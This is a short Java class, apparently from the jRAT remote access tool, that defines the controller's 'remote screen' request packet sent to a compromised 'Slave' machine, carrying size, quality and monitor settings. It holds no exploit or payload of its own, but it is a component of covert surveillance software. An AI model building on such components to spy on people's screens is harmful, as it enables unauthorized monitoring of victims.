package io.jrat.client.packets.outgoing;

import io.jrat.client.Slave;

import java.io.DataOutputStream;


public class Packet12RemoteScreen extends AbstractOutgoingPacket {

	private int size;
	private int quality;
	private int monitor;

	public Packet12RemoteScreen(int size, int quality, int monitor) {
		this.size = size;
		this.quality = quality;
		this.monitor = monitor;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(size);
		dos.writeInt(quality);
		dos.writeInt(monitor);
	}

	@Override
	public byte getPacketId() {
		return 12;
	}

}
